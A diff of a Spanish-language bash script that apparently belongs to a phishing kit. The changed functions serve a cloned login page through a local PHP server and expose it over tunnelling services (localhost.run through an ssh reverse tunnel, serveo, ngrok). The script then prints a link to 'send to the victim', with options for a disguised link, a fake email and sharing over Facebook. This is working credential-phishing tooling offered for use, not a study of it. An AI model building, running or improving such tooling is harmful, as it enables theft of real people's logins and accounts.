@@ -1,47 +1,42 @@
-localrun(){
-        command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
-        echo
+localhost(){
+	echo
         php -S localhost:3333 > /dev/null 2>&1 &
-	if [[ $clonada == "si" ]];then
+        if [[ $clonada == "si" ]];then
                 descargar_pagina
         fi
-        echo -e "$v[$b*$v]$b Enpezando..."
-        sleep 2
-        if [[ -f run ]];then
-                rm run
-        fi
-        
-        $(which sh) -c 'ssh -R 80:localhost:$port nokey@localhost.run 2> /dev/null > run ' &
         echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
-        sleep 5
-        echo -e "$v[$b*$v]$b Abriendo local.run..."
-        sleep 5
-        echo -e "$v[$b*$v]$b Obteniendo links..."
-        sleep 5
-        envialink=$(grep -o "https://u0_[0-9a-z]*\.localhost.run" run)
-        
-        if [[ $envialink == "" ]];then
-                echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
-                exit 1
-        else
-                echo -e "$v[$b*$v]$b localhost:3333"
-                echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
-                disfraz
-                check
+        sleep 2
+        echo -e "$v[$b*$v]$b localhost:3333"
+        disfraz
+        check
         #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
         if [[ $add7 == "7" ]];then
                 echo -e "$v[$b*$v]$b Enviando email..."
         fi
                 check_found
-        fi
-        if [[ -f run ]]; then
-                rm run
-        fi
 }
+
+localrun(){
+        echo
+        php -S localhost:3333 > /dev/null 2>&1 &
+	if [[ $clonada == "si" ]];then
+                descargar_pagina
+        fi
+        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
+        sleep 2
+        echo -e "$v[$b*$v]$b localhost:3333"
+        echo -e "$v[$b*$v]$b Porfavor abre una nueva sessión, ingresa a la ruta del script y ejecuta: bash ltunnel.sh, recuerda tener openssh instalado"
+        disfraz
+        check
+        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
+        if [[ $add7 == "7" ]];then
+                echo -e "$v[$b*$v]$b Enviando email..."
+        fi
+                check_found
+  }
 
 
 serveo(){
-        command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
 	if [[ $clonada == "si" ]];then
                 descargar_pagina
         fi
@@ -109,6 +104,7 @@ ngrok(){
                 echo -e "$v[$b*$v]$b Envia a la victima: \e[0;32m$envialink"
                 cd $ruta_carpeta
                 disfraz
+		echo -e "$v[$b*$v]$b Envio por facebook:\e[0;32m " $pop9
         #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
         if [[ $add7 == "7" ]];then
                 echo -e "$v[$b*$v]$b Enviando email..."
